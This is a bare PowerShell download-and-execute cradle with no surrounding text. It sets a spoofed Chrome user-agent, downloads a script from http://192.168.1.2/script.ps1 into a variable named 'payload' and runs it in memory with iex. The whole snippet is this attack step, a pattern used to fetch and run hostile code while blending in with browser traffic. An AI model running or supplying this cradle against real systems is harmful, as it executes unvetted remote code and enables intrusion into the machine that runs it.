$downloader = New-Object System.Net.WebClient
$downloader.Headers.add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.1234.55 Safari/537.36")
$payload = "http://192.168.1.2/script.ps1"
$command = $downloader.DownloadString($payload)
iex $command